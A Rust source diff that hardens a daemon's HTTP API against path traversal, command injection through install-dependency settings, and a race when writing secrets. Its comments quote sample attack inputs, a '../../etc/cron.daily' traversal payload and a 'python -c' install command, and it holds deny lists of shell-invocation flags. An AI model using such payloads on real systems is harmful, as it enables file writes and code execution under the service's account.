@@ -228,7 +228,8 @@ pub fn router() -> axum::Router<std::sync::Arc<super::AppState>> {
         .route("/extensions/{name}", axum::routing::get(get_extension))
 }
 
-use super::channels::FieldType;
+// `super::channels::FieldType` import removed alongside
+// the channel-config write helpers that consumed it.
 use super::config::json_to_toml_value;
 use super::AppState;
 use super::RequestLanguage;
@@ -375,6 +376,30 @@ pub async fn install_skill(
     State(state): State<Arc<AppState>>,
     Json(req): Json<SkillInstallRequest>,
 ) -> impl IntoResponse {
+    // Reject path-traversal payloads on BOTH `name` and `hand` before
+    // letting either reach `Path::join`. Pre-fix the handler did
+    // `home.join("registry").join("skills").join(&req.name)` and
+    // `home.join("workspaces").join("hands").join(hand_id)` with no
+    // rejection of `..` / `/` / `\`, so a payload like
+    // `{"name":"../../etc/cron.daily/payload"}` would (a) leak FS
+    // existence via the `.exists()` probe (200 / 404 oracle) and (b)
+    // let `copy_dir_recursive` write outside `~/.librefang/skills/`
+    // (full filesystem write under the daemon UID). The sibling
+    // `uninstall_skill` at `librefang-skills/src/evolution.rs:1277`
+    // already hardens uninstall — this brings install in line. The
+    // validator below matches the project's strict pattern from
+    // `agent_templates.rs:113-124` (alphanumeric + `_` + `-`, ≤ 64
+    // chars, no leading `.`). (audit:
+    // skill-install-path-traversal)
+    if let Err(reason) = validate_skill_identifier(&req.name, "name") {
+        return ApiErrorResponse::bad_request(reason).into_json_tuple();
+    }
+    if let Some(ref hand_id) = req.hand {
+        if let Err(reason) = validate_skill_identifier(hand_id, "hand") {
+            return ApiErrorResponse::bad_request(reason).into_json_tuple();
+        }
+    }
+
     let home = state.kernel.home_dir();
     let skills_dir = if let Some(ref hand_id) = req.hand {
         let hand_dir = home.join("workspaces").join("hands").join(hand_id);
@@ -387,8 +412,7 @@ pub async fn install_skill(
         home.join("skills")
     };
     if let Err(e) = std::fs::create_dir_all(&skills_dir) {
-        return ApiErrorResponse::internal(format!("Failed to create skills dir: {e}"))
-            .into_json_tuple();
+        return ApiErrorResponse::internal_scrub(e).into_json_tuple();
     }
 
     // Install from local registry (~/.librefang/registry/skills/{name}/)
@@ -433,7 +457,7 @@ pub async fn install_skill(
             tracing::warn!("Skill install failed: {e}");
             // Clean up partial copy
             let _ = std::fs::remove_dir_all(&dest);
-            ApiErrorResponse::internal(format!("Install failed: {e}")).into_json_tuple()
+            ApiErrorResponse::internal_scrub(e).into_json_tuple()
         }
     }
 }
@@ -854,6 +878,49 @@ pub async fn list_skill_registry(State(state): State<Arc<AppState>>) -> impl Int
 
     let total = skills.len();
     Json(serde_json::json!({ "skills": skills, "total": total }))
+}
+
+/// Path-traversal hardening for `install_skill` (audit:
+/// skill-install-path-traversal). Used on both `req.name` (joined
+/// onto `registry/skills/`) and `req.hand` (joined onto
+/// `workspaces/hands/`).
+///
+/// Contract:
+/// - non-empty, ≤ 64 chars (caps log noise and matches the project
+///   pattern from `agent_templates.rs::validate_template_name`)
+/// - characters limited to `[A-Za-z0-9_-]` — the strictest project
+///   convention; cannot contain `..`, `/`, `\`, or any platform
+///   path separator
+/// - first character must be alphanumeric — rejects `-foo` and
+///   `_foo` (option-arg / dotfile-style ambiguity) and `.foo`
+///   (leading-dot dotfile)
+///
+/// `field` is "name" or "hand" — used to scope the rejection
+/// message so the client knows which input was bad.
+fn validate_skill_identifier(value: &str, field: &str) -> Result<(), String> {
+    if value.is_empty() || value.len() > 64 {
+        return Err(format!(
+            "invalid skill {field}: must be 1-64 characters, got {} chars",
+            value.len()
+        ));
+    }
+    let all_safe = value
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
+    if !all_safe {
+        return Err(format!(
+            "invalid skill {field}: only [A-Za-z0-9_-] allowed (no path separators, dots, or other punctuation)"
+        ));
+    }
+    // First-char-alphanumeric rule (rejects leading `-` / `_` /
+    // `.`). `.empty()` is impossible here — we just bounded above.
+    let first = value.chars().next().expect("non-empty checked above");
+    if !first.is_ascii_alphanumeric() {
+        return Err(format!(
+            "invalid skill {field}: must start with an alphanumeric character"
+        ));
+    }
+    Ok(())
 }
 
 /// Parse YAML frontmatter from a SKILL.md file. Returns `(name, description)`.
@@ -2600,6 +2667,72 @@ pub async fn check_hand_deps(
     }
 }
 
+/// Package managers `install_hand_deps` is allowed to invoke.
+///
+/// Audit (`docs/issues/install-deps-rce-admin.md`): the historical
+/// metacharacter-only blocklist (`;|&$\`><(){}\n\r`) is bypassed when an
+/// Admin authors `install_deps = ["python", "-c", "import os; …"]` in a
+/// HAND.toml — the punctuation lands inside the quoted `-c` argument and
+/// `Command::new("python")` runs the interpreter under the daemon UID.
+/// Locking `parts[0]` to known package-manager binaries collapses that
+/// pathway: a language runtime / generic shell cannot be named here at
+/// all, so the `-c` payload has no executor.
+const INSTALL_DEPS_ALLOWED_PROGRAMS: &[&str] = &[
+    "apt", "apt-get", "dnf", "pacman", "brew", "winget", "pip", "pip3", "npm", "cargo",
+];
+
+/// Argument flags that turn an otherwise-safe binary into a generic
+/// code-execution sink. `pip`, `npm`, etc. legitimately never need these,
+/// so a bare match is sufficient — we also catch the `=value` long-form
+/// variants for the long flags. Compared case-insensitively against
+/// each `args` entry.
+const INSTALL_DEPS_DENIED_ARG_FLAGS: &[&str] =
+    &["-c", "-e", "--exec", "--shell", "--eval", "--command"];
+
+/// Long-flag prefixes (`--name=value`) that are equivalent to the
+/// denied bare flags above and must also be rejected.
+const INSTALL_DEPS_DENIED_ARG_PREFIXES: &[&str] = &["--exec=", "--shell=", "--eval=", "--command="];
+
+/// Validate the program + args extracted from a HAND.toml install command
+/// against the allowlist (program) and denylist (args). Returns the human
+/// reason on rejection so the per-dep result message stays informative;
+/// returns `Ok(())` on success.
+///
+/// Pure helper — no I/O, no globals — so the rejection rules can be
+/// exercised by `cargo test -p librefang-api` without booting a hand
+/// instance. The handler still loops over per-dep validation; this
+/// function only adjudicates one (program, args) tuple.
+fn validate_install_deps_argv(program: &str, args: &[&str]) -> Result<(), String> {
+    // Absolute paths defeat the allowlist: a HAND could name `/bin/sh`
+    // (Unix) or `\\?\C:\Windows\System32\cmd.exe` (Windows) and the
+    // allowlist would never match. Reject both shapes up front.
+    if program.starts_with('/') || program.contains('\\') {
+        return Err(format!(
+            "Install command program '{program}' uses an absolute path; \
+             only bare package-manager binary names are allowed"
+        ));
+    }
+    if !INSTALL_DEPS_ALLOWED_PROGRAMS.contains(&program) {
+        return Err(format!(
+            "Install command program '{program}' is not in install-deps allowlist ({})",
+            INSTALL_DEPS_ALLOWED_PROGRAMS.join(", ")
+        ));
+    }
+    if let Some(flag) = args.iter().find(|a| {
+        let lower = a.to_ascii_lowercase();
+        INSTALL_DEPS_DENIED_ARG_FLAGS.iter().any(|f| lower == *f)
+            || INSTALL_DEPS_DENIED_ARG_PREFIXES
+                .iter()
+                .any(|p| lower.starts_with(p))
+    }) {
+        return Err(format!(
+            "Install command contains disallowed flag '{flag}' \
+             (shell-invocation flags are blocked)"
+        ));
+    }
+    Ok(())
+}
+
 /// POST /api/hands/{hand_id}/install-deps — Auto-install missing dependencies for a hand.
 #[utoipa::path(
     post,
@@ -2718,6 +2851,23 @@ pub async fn install_hand_deps(
         }
         let program = parts[0];
         let args = &parts[1..];
+
+        // Allowlist program names + reject shell-invocation flags. See
+        // `validate_install_deps_argv` for the rationale and the full
+        // allow/deny tables. Returns the *reason* string so the per-dep
+        // result still carries a useful message; the metacharacter guard
+        // above stays as a defence-in-depth predecessor (a `python -c`
+        // payload that includes `;` is caught earlier and never reaches
+        // this point).
+        if let Err(reason) = validate_install_deps_argv(program, args) {
+            results.push(serde_json::json!({
+                "key": req.key,
+                "status": "error",
+                "command": final_cmd,
+                "message": reason,
+            }));
+            continue;
+        }
 
         tracing::info!(hand = %hand_id, dep = %req.key, cmd = %final_cmd, "Auto-installing dependency");
 
@@ -3225,8 +3375,7 @@ pub async fn set_hand_secret(
     // Write to secrets.env
     let secrets_path = state.kernel.home_dir().join("secrets.env");
     if let Err(e) = write_secret_env(&secrets_path, &env_key, &value) {
-        return ApiErrorResponse::internal(format!("Failed to write secret: {e}"))
-            .into_json_tuple();
+        return ApiErrorResponse::internal_scrub(e).into_json_tuple();
     }
 
     // Set in current process. Serialized through the process-global env
@@ -3591,12 +3740,12 @@ pub async fn hand_send_message(
         Err(e) => return e,
     };
 
-    // Reject oversized messages
-    const MAX_MESSAGE_SIZE: usize = 64 * 1024;
-    if req.message.len() > MAX_MESSAGE_SIZE {
+    // Reject oversized messages — see check_message_size for the
+    // byte/char split. Audit: message-byte-vs-char-cap.
+    if let Err(e) = crate::validation::check_message_size(&req.message) {
         return (
             StatusCode::PAYLOAD_TOO_LARGE,
-            Json(serde_json::json!({"error": "Message too large (max 64KB)"})),
+            Json(serde_json::json!({"error": e.message})),
         );
     }
 
@@ -3662,12 +3811,16 @@ pub async fn hand_send_message(
                     memory_conflicts: result.memory_conflicts,
                     thinking: None,
                     owner_notice: result.owner_notice,
+                    // Hands do not surface an auto-pinnable session id via
+                    // this body (#5199 is dashboard-chat-only). Field
+                    // omitted when None via `skip_serializing_if`.
+                    session_id: None,
                 })),
             )
         }
         Err(e) => {
             tracing::warn!("hand_send_message failed for instance {id}: {e}");
-            ApiErrorResponse::internal(format!("Message delivery failed: {e}")).into_json_tuple()
+            ApiErrorResponse::internal_scrub(e).into_json_tuple()
         }
     }
 }
@@ -3769,9 +3922,7 @@ pub async fn hand_get_session(
             )
         }
         Ok(None) => (StatusCode::OK, Json(serde_json::json!({ "messages": [] }))),
-        Err(e) => {
-            ApiErrorResponse::internal(format!("Failed to load session: {e}")).into_json_tuple()
-        }
+        Err(e) => ApiErrorResponse::internal_scrub(e).into_json_tuple(),
     }
 }
 
@@ -4246,8 +4397,7 @@ pub async fn add_mcp_server(
     // Persist to config.toml
     let config_path = state.kernel.home_dir().join("config.toml");
     if let Err(e) = upsert_mcp_server_config(&config_path, &entry) {
-        return ApiErrorResponse::internal(format!("Failed to write config: {e}"))
-            .into_json_tuple();
+        return ApiErrorResponse::internal_scrub(e).into_json_tuple();
     }
 
     // Trigger config reload
@@ -4263,8 +4413,15 @@ pub async fn add_mcp_server(
     };
 
     // Establish connection to the newly added server in the background.
+    // Wrap in `spawn_supervised` so a panic inside `connect_mcp_servers`
+    // (e.g. parse failure, OAuth handshake, tool list deserialization) is
+    // logged at `error!` rather than silently aborting the detached task
+    // and leaving the new server stuck in a half-connecting state.
     let kernel = std::sync::Arc::clone(&state.kernel);
-    tokio::spawn(async move { kernel.connect_mcp_servers().await });
+    librefang_kernel::supervised_spawn::spawn_supervised(
+        "connect_mcp_servers_after_add",
+        async move { kernel.connect_mcp_servers().await },
+    );
 
     state.kernel.audit().record(
         "system",
@@ -4370,7 +4527,10 @@ pub async fn update_mcp_server(
     // Disconnect the old connection so connect_mcp_servers picks up the new config.
     state.kernel.disconnect_mcp_server(&name).await;
     let kernel = std::sync::Arc::clone(&state.kernel);
-    tokio::spawn(async move { kernel.connect_mcp_servers().await });
+    librefang_kernel::supervised_spawn::spawn_supervised(
+        "connect_mcp_servers_after_update",
+        async move { kernel.connect_mcp_servers().await },
+    );
 
     state.kernel.audit().record(
         "system",
@@ -4488,7 +4648,10 @@ pub async fn patch_mcp_server_taint(
     // already updates via `reload_config` without a reconnect.
     state.kernel.disconnect_mcp_server(&name).await;
     let kernel = std::sync::Arc::clone(&state.kernel);
-    tokio::spawn(async move { kernel.connect_mcp_servers().await });
+    librefang_kernel::supervised_spawn::spawn_supervised(
+        "connect_mcp_servers_after_taint_patch",
+        async move { kernel.connect_mcp_servers().await },
+    );
 
     state.kernel.audit().record(
         "system",
@@ -5052,8 +5215,7 @@ pub async fn get_supporting_file(
     let content = match std::fs::read_to_string(&canonical) {
         Ok(s) => s,
         Err(e) => {
-            return ApiErrorResponse::internal(format!("Failed to read file: {e}"))
-                .into_json_tuple();
+            return ApiErrorResponse::internal_scrub(e).into_json_tuple();
         }
     };
     let (truncated, body) = if content.len() > MAX_BYTES {
@@ -5345,69 +5507,6 @@ pub async fn evolve_remove_file(
 
 // ── Helper functions for secrets.env management ────────────────────────
 
-/// Denylist of critical system environment variables that must not be overwritten.
-const DENIED_ENV_VARS: &[&str] = &[
-    "PATH",
-    "HOME",
-    "USER",
-    "SHELL",
-    "LD_PRELOAD",
-    "LD_LIBRARY_PATH",
-    "DYLD_LIBRARY_PATH",
-    "DYLD_INSERT_LIBRARIES",
-    "TERM",
-    "LANG",
-    "PWD",
-];
-
-/// Maximum allowed length for an environment variable value.
-const ENV_VALUE_MAX_LEN: usize = 4096;
-
-/// Validate an environment variable name and value before setting them.
-///
-/// Rules:
-/// - Name must match `^[A-Za-z_][A-Za-z0-9_]*$`
-/// - Name must not be in the system denylist
-/// - Value length must not exceed [`ENV_VALUE_MAX_LEN`]
-pub(crate) fn validate_env_var(name: &str, value: &str) -> Result<(), String> {
-    // Check name format: must start with letter or underscore, then alphanumeric/underscore
-    if name.is_empty() {
-        return Err("Environment variable name must not be empty".to_string());
-    }
-    let first = name.as_bytes()[0];
-    if !(first.is_ascii_alphabetic() || first == b'_') {
-        return Err(format!(
-            "Environment variable name '{}' must start with a letter or underscore",
-            name
-        ));
-    }
-    if !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
-        return Err(format!(
-            "Environment variable name '{}' contains invalid characters (only A-Z, a-z, 0-9, _ allowed)",
-            name
-        ));
-    }
-
-    // Check denylist
-    let upper = name.to_ascii_uppercase();
-    if DENIED_ENV_VARS.iter().any(|&d| d == upper) {
-        return Err(format!(
-            "Environment variable '{}' is a protected system variable and cannot be overwritten",
-            name
-        ));
-    }
-
-    // Check value length
-    if value.len() > ENV_VALUE_MAX_LEN {
-        return Err(format!(
-            "Environment variable value exceeds maximum length of {} bytes",
-            ENV_VALUE_MAX_LEN
-        ));
-    }
-
-    Ok(())
-}
-
 /// Escape a value for safe storage in a `.env` file.
 ///
 /// If a value contains literal newlines the raw `KEY=value\nEXTRA=junk` text
@@ -5420,10 +5519,6 @@ fn escape_env_value(value: &str) -> String {
         .replace('\r', "\\r")
 }
 
-/// Write or update a key in the secrets.env file.
-/// File format: one `KEY=value` per line. Existing keys are overwritten.
-/// Values containing newlines or backslashes are escaped so they stay on a
-/// single line and round-trip correctly through dotenv parsers.
 pub(crate) fn write_secret_env(
     path: &std::path::Path,
     key: &str,
@@ -5465,18 +5560,25 @@ pub(crate) fn write_secret_env(
         std::fs::create_dir_all(parent)?;
     }
 
-    std::fs::write(path, lines.join("\n") + "\n")?;
-
-    // SECURITY: Restrict file permissions on Unix
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        if let Err(e) = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600)) {
-            tracing::warn!("Failed to set file permissions: {e}");
-        }
-    }
-
-    Ok(())
+    // Atomic mode-0600 write (audit: write-secret-env-toctou).
+    //
+    // Pre-fix the path was `fs::write` (opens at the process umask,
+    // typically `0644`) followed by `chmod 0600`. Between the
+    // write-syscall completion and the chmod-syscall completion any
+    // local user on the same host could `cat ~/.librefang/secrets.env`
+    // and read every provider API key the daemon has stored — the
+    // exact race `save_sessions` was hardened against in #3939 /
+    // #3725 (`server.rs:948-987` uses `OpenOptions::mode(0o600)` on a
+    // temp file then atomic-renames). The secrets-write path missed
+    // that rewrite; the TOCTOU window re-opened on every "save key"
+    // dashboard action.
+    //
+    // Pattern: create a sibling `.tmp` file with `0600` from the
+    // start, write the content, fsync, then atomic-rename onto the
+    // canonical path. `rename(2)` is atomic within a filesystem; the
+    // destination inode appears with `0600` already set, never at
+    // umask defaults.
+    atomic_write_secret_file(path, lines.join("\n") + "\n")
 }
 
 /// Remove a key from the secrets.env file.
@@ -5493,387 +5595,70 @@ pub(crate) fn remove_secret_env(path: &std::path::Path, key: &str) -> Result<(),
         .map(|l| l.to_string())
         .collect();
 
-    std::fs::write(path, lines.join("\n") + "\n")?;
+    // Same mode-0600 atomic-rename pattern as `write_secret_env`.
+    // `remove_secret_env` has the same TOCTOU window the audit
+    // calls out — a key removal still rewrites the whole file with
+    // every remaining key in plaintext.
+    atomic_write_secret_file(path, lines.join("\n") + "\n")
+}
 
-    Ok(())
+/// Atomically replace `path` with `content`, ensuring the resulting
+/// inode is mode `0600` (Unix) from creation — never observable at
+/// the process umask. Writes to a sibling `.tmp` file first to keep
+/// the rename within the same filesystem (so `rename(2)` is
+/// atomic). On non-Unix targets the helper still uses the temp +
+/// rename shape so partial writes can't tear the file; the
+/// per-permissions bit is a no-op (Windows ACLs are inherited from
+/// the parent directory, which lives under the daemon-UID user
+/// profile).
+fn atomic_write_secret_file(path: &std::path::Path, content: String) -> Result<(), std::io::Error> {
+    use std::io::Write as _;
+    let parent = path.parent().unwrap_or_else(|| std::path::Path::new("."));
+    let file_name = path
+        .file_name()
+        .map(|n| n.to_owned())
+        .unwrap_or_else(|| std::ffi::OsString::from("secrets.env"));
+    let mut tmp_name = file_name;
+    tmp_name.push(".tmp");
+    let tmp_path = parent.join(tmp_name);
+
+    // Open with mode 0600 from the start on Unix. The temp file is
+    // discarded on any error path below so we don't leak a partial
+    // write on disk.
+    let mut opts = std::fs::OpenOptions::new();
+    opts.write(true).create(true).truncate(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt as _;
+        opts.mode(0o600);
+    }
+    let mut f = opts.open(&tmp_path)?;
+    f.write_all(content.as_bytes())?;
+    f.sync_all()?;
+    drop(f);
+
+    // `rename(2)` is atomic — the destination either contains the
+    // old bytes (pre-rename) or the new bytes (post-rename); a
+    // concurrent reader never observes a half-written file.
+    match std::fs::rename(&tmp_path, path) {
+        Ok(()) => Ok(()),
+        Err(e) => {
+            // Clean up the temp file so we don't accrete `*.tmp`
+            // litter on partial-failure paths.
+            let _ = std::fs::remove_file(&tmp_path);
+            Err(e)
+        }
+    }
 }
 
 // ── Config.toml channel management helpers ──────────────────────────
 
-/// Sentinel error message produced by `upsert_channel_config` and
-/// `remove_channel_config` when the channel is in `[[channels.<name>]]`
-/// (array-of-tables) shape. The handler matches on this prefix to map the
-/// failure to 409 Conflict instead of 500. Multi-instance channels must
-/// use the per-instance API (`/api/channels/<name>/instances/...`); the
-/// legacy single-instance `/configure` endpoint cannot represent them
-/// without silently dropping every instance after the first (#4865).
-pub(crate) const CHANNEL_AOT_CONFLICT_PREFIX: &str = "channel-is-multi-instance:";
-
-/// Upsert a `[channels.<name>]` section in config.toml with the given non-secret fields.
-///
-/// Uses `toml_edit::DocumentMut` to preserve comments, key ordering, and
-/// formatting of unrelated sections (providers, agents, etc.). The previous
-/// `toml::Value` round-trip silently rewrote the entire file on every
-/// channel write — see issue #3183. Callers must hold
-/// `AppState::config_write_lock` to serialize against `POST /api/config/set`,
-/// which performs an asymmetric read-modify-write on the same file.
-///
-/// Refuses to write when the channel already exists as `[[channels.<name>]]`
-/// (multi-instance) — the legacy single-table write would silently delete
-/// every instance after the first. Callers must route to the per-instance
-/// API in that case (#4865).
-pub(crate) fn upsert_channel_config(
-    config_path: &std::path::Path,
-    channel_name: &str,
-    fields: &HashMap<String, (String, FieldType)>,
-) -> Result<(), Box<dyn std::error::Error>> {
-    validate_static_file_path(config_path, "config.toml")
-        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;
-    let content = if config_path.exists() {
-        std::fs::read_to_string(config_path)?
-    } else {
-        String::new()
-    };
-
-    let mut doc: toml_edit::DocumentMut = if content.trim().is_empty() {
-        toml_edit::DocumentMut::new()
-    } else {
-        content.parse()?
-    };
-
-    // Ensure [channels] table exists
-    if !doc.contains_table("channels") {
-        doc["channels"] = toml_edit::Item::Table(toml_edit::Table::new());
-    }
-    let channels_table = doc["channels"]
-        .as_table_mut()
-        .ok_or("channels is not a table")?;
-
-    // Refuse to clobber an existing `[[channels.<name>]]` array. The
-    // legacy single-table replace path below would otherwise silently drop
-    // every instance after the first — see issue #4865.
-    if matches!(
-        channels_table.get(channel_name),
-        Some(toml_edit::Item::ArrayOfTables(_))
-    ) {
-        return Err(format!(
-            "{CHANNEL_AOT_CONFLICT_PREFIX}channel '{channel_name}' has multiple instances; use the per-instance API"
-        )
-        .into());
-    }
-
-    // Build channel sub-table with correct TOML types
-    let ch_table = build_channel_toml_table(fields);
-    channels_table.insert(channel_name, toml_edit::Item::Table(ch_table));
-
-    // Ensure parent directory exists
-    if let Some(parent) = config_path.parent() {
-        std::fs::create_dir_all(parent)?;
-    }
-
-    std::fs::write(config_path, doc.to_string())?;
-    Ok(())
-}
-
-/// Remove a `[channels.<name>]` section from config.toml.
-///
-/// Mirrors `upsert_channel_config`: format-preserving via `toml_edit`, and
-/// callers must hold `AppState::config_write_lock`.
-///
-/// Refuses to delete when the channel exists as `[[channels.<name>]]`
-/// (multi-instance) — the bulk delete would silently nuke every instance.
-/// Callers must use `DELETE /api/channels/<name>/instances/<id>` to remove
-/// instances individually (#4865).
-pub(crate) fn remove_channel_config(
-    config_path: &std::path::Path,
-    channel_name: &str,
-) -> Result<(), Box<dyn std::error::Error>> {
-    validate_static_file_path(config_path, "config.toml")
-        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;
-    if !config_path.exists() {
-        return Ok(());
-    }
-
-    let content = std::fs::read_to_string(config_path)?;
-    if content.trim().is_empty() {
-        return Ok(());
-    }
-
-    let mut doc: toml_edit::DocumentMut = content.parse()?;
-
-    if let Some(channels) = doc.get_mut("channels").and_then(|i| i.as_table_mut()) {
-        if matches!(
-            channels.get(channel_name),
-            Some(toml_edit::Item::ArrayOfTables(_))
-        ) {
-            return Err(format!(
-                "{CHANNEL_AOT_CONFLICT_PREFIX}channel '{channel_name}' has multiple instances; use the per-instance API"
-            )
-            .into());
-        }
-        channels.remove(channel_name);
-    }
-
-    std::fs::write(config_path, doc.to_string())?;
-    Ok(())
-}
-
-/// Build a TOML table from a `(key, (value, field_type))` field map.
-///
-/// Shared between `upsert_channel_config` and the per-instance helpers
-/// (`append_channel_instance`, `update_channel_instance`) so number / list
-/// coercion stays consistent across all channel write paths.
-fn build_channel_toml_table(fields: &HashMap<String, (String, FieldType)>) -> toml_edit::Table {
-    let mut ch_table = toml_edit::Table::new();
-    for (k, (v, ft)) in fields {
-        let item = match ft {
-            FieldType::Number => {
-                if let Ok(n) = v.parse::<i64>() {
-                    toml_edit::value(n)
-                } else {
-                    toml_edit::value(v.clone())
-                }
-            }
-            FieldType::List => {
-                let mut arr = toml_edit::Array::new();
-                for s in v.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()) {
-                    arr.push(s);
-                }
-                toml_edit::value(arr)
-            }
-            _ => toml_edit::value(v.clone()),
-        };
-        ch_table.insert(k, item);
-    }
-    ch_table
-}
-
-/// Open `config.toml` as a `DocumentMut` (creating an empty doc if the file
-/// is absent or empty) and return both the doc and the parent dir to create
-/// before writing back. Centralises the read-validate-parse boilerplate
-/// shared by every channel-instance helper.
-fn open_config_doc(
-    config_path: &std::path::Path,
-) -> Result<toml_edit::DocumentMut, Box<dyn std::error::Error>> {
-    validate_static_file_path(config_path, "config.toml")
-        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;
-    let content = if config_path.exists() {
-        std::fs::read_to_string(config_path)?
-    } else {
-        String::new()
-    };
-    let doc: toml_edit::DocumentMut = if content.trim().is_empty() {
-        toml_edit::DocumentMut::new()
-    } else {
-        content.parse()?
-    };
-    Ok(doc)
-}
-
-fn write_config_doc(
-    config_path: &std::path::Path,
-    doc: &toml_edit::DocumentMut,
-) -> Result<(), Box<dyn std::error::Error>> {
-    if let Some(parent) = config_path.parent() {
-        std::fs::create_dir_all(parent)?;
-    }
-    std::fs::write(config_path, doc.to_string())?;
-    Ok(())
-}
-
-/// Append a new `[[channels.<name>]]` instance to config.toml.
-///
-/// Auto-promotes a single `[channels.<name>]` table to an `ArrayOfTables`
-/// containing the previous entry plus the new one, so the user can keep
-/// the channel they configured via the legacy `/configure` endpoint and
-/// still add another instance on top. Callers must hold
-/// `AppState::config_write_lock` (same locking discipline as
-/// `upsert_channel_config` — see issue #3183).
-pub(crate) fn append_channel_instance(
-    config_path: &std::path::Path,
-    channel_name: &str,
-    fields: &HashMap<String, (String, FieldType)>,
-) -> Result<usize, Box<dyn std::error::Error>> {
-    let mut doc = open_config_doc(config_path)?;
-
-    if !doc.contains_table("channels") {
-        doc["channels"] = toml_edit::Item::Table(toml_edit::Table::new());
-    }
-    let channels_table = doc["channels"]
-        .as_table_mut()
-        .ok_or("channels is not a table")?;
-
-    let new_entry = build_channel_toml_table(fields);
-
-    // Resolve the existing item under channels.<name>, if any. Three shapes
-    // are possible:
-    //   - missing: create a new ArrayOfTables containing the new entry
-    //   - single Table (legacy `[channels.<name>]`): promote to
-    //     ArrayOfTables = [old, new]
-    //   - existing ArrayOfTables: push the new entry
-    let new_index = match channels_table.remove(channel_name) {
-        None => {
-            let mut aot = toml_edit::ArrayOfTables::new();
-            aot.push(new_entry);
-            channels_table.insert(channel_name, toml_edit::Item::ArrayOfTables(aot));
-            0
-        }
-        Some(toml_edit::Item::Table(existing)) => {
-            let mut aot = toml_edit::ArrayOfTables::new();
-            aot.push(existing);
-            aot.push(new_entry);
-            channels_table.insert(channel_name, toml_edit::Item::ArrayOfTables(aot));
-            1
-        }
-        Some(toml_edit::Item::ArrayOfTables(mut aot)) => {
-            aot.push(new_entry);
-            let idx = aot.len() - 1;
-            channels_table.insert(channel_name, toml_edit::Item::ArrayOfTables(aot));
-            idx
-        }
-        Some(other) => {
-            // Re-insert what we removed so the file isn't accidentally mutated.
-            channels_table.insert(channel_name, other);
-            return Err(format!(
-                "channels.{channel_name} has an unsupported TOML shape (expected table or array of tables)"
-            )
-            .into());
-        }
-    };
-
-    write_config_doc(config_path, &doc)?;
-    Ok(new_index)
-}
-
-/// Replace a single `[[channels.<name>]]` instance at `index`.
-///
-/// Accepts either the legacy single-table form (when `index == 0`) or an
-/// `ArrayOfTables`. Returns `Err` if the index is out of bounds or the
-/// channel is not present in the document. Callers must hold
-/// `AppState::config_write_lock`.
-pub(crate) fn update_channel_instance(
-    config_path: &std::path::Path,
-    channel_name: &str,
-    index: usize,
-    fields: &HashMap<String, (String, FieldType)>,
-) -> Result<(), Box<dyn std::error::Error>> {
-    let mut doc = open_config_doc(config_path)?;
-
-    let channels_table = doc
-        .get_mut("channels")
-        .and_then(|i| i.as_table_mut())
-        .ok_or_else(|| format!("channels.{channel_name} is not configured"))?;
-
-    let new_entry = build_channel_toml_table(fields);
-
-    match channels_table.get_mut(channel_name) {
-        None => {
-            return Err(format!("channels.{channel_name} is not configured").into());
-        }
-        Some(toml_edit::Item::Table(table)) => {
-            if index != 0 {
-                return Err(format!(
-                    "channels.{channel_name}[{index}] is out of bounds (only one instance configured)"
-                )
-                .into());
-            }
-            *table = new_entry;
-        }
-        Some(toml_edit::Item::ArrayOfTables(aot)) => {
-            if index >= aot.len() {
-                return Err(format!(
-                    "channels.{channel_name}[{index}] is out of bounds (have {} instance(s))",
-                    aot.len()
-                )
-                .into());
-            }
-            // ArrayOfTables doesn't expose direct index assignment, so rebuild
-            // by iterating: collect the existing entries, swap at `index`, and
-            // reinsert the rebuilt array.
-            let mut rebuilt = toml_edit::ArrayOfTables::new();
-            for (i, existing) in aot.iter().enumerate() {
-                if i == index {
-                    rebuilt.push(new_entry.clone());
-                } else {
-                    rebuilt.push(existing.clone());
-                }
-            }
-            *aot = rebuilt;
-        }
-        Some(_other) => {
-            return Err(format!(
-                "channels.{channel_name} has an unsupported TOML shape (expected table or array of tables)"
-            )
-            .into());
-        }
-    }
-
-    write_config_doc(config_path, &doc)?;
-    Ok(())
-}
-
-/// Remove the `[[channels.<name>]]` instance at `index`.
-///
-/// If the channel is stored as a single legacy table, the entire section is
-/// removed when `index == 0`. If stored as an `ArrayOfTables` and the array
-/// becomes empty, the whole `channels.<name>` key is removed. Callers must
-/// hold `AppState::config_write_lock`.
-pub(crate) fn remove_channel_instance(
-    config_path: &std::path::Path,
-    channel_name: &str,
-    index: usize,
-) -> Result<(), Box<dyn std::error::Error>> {
-    let mut doc = open_config_doc(config_path)?;
-
-    let channels_table = match doc.get_mut("channels").and_then(|i| i.as_table_mut()) {
-        Some(t) => t,
-        None => return Err(format!("channels.{channel_name} is not configured").into()),
-    };
-
-    match channels_table.get_mut(channel_name) {
-        None => {
-            return Err(format!("channels.{channel_name} is not configured").into());
-        }
-        Some(toml_edit::Item::Table(_)) => {
-            if index != 0 {
-                return Err(format!(
-                    "channels.{channel_name}[{index}] is out of bounds (only one instance configured)"
-                )
-                .into());
-            }
-            channels_table.remove(channel_name);
-        }
-        Some(toml_edit::Item::ArrayOfTables(aot)) => {
-            if index >= aot.len() {
-                return Err(format!(
-                    "channels.{channel_name}[{index}] is out of bounds (have {} instance(s))",
-                    aot.len()
-                )
-                .into());
-            }
-            let mut rebuilt = toml_edit::ArrayOfTables::new();
-            for (i, existing) in aot.iter().enumerate() {
-                if i != index {
-                    rebuilt.push(existing.clone());
-                }
-            }
-            if rebuilt.is_empty() {
-                channels_table.remove(channel_name);
-            } else {
-                *aot = rebuilt;
-            }
-        }
-        Some(_other) => {
-            return Err(format!(
-                "channels.{channel_name} has an unsupported TOML shape (expected table or array of tables)"
-            )
-            .into());
-        }
-    }
-
-    write_config_doc(config_path, &doc)?;
-    Ok(())
-}
+// `CHANNEL_AOT_CONFLICT_PREFIX` was the sentinel-error prefix
+// `upsert_channel_config` / `remove_channel_config` returned when
+// the channel was in `[[channels.<name>]]` array-of-tables shape;
+// the handler matched on the prefix to map the failure to 409
+// Conflict. Both helpers + the sentinel are gone with the rest of
+// the in-process channel-config write path.
 
 // ---------------------------------------------------------------------------
 // MCP catalog + reconnect + health + reload endpoints
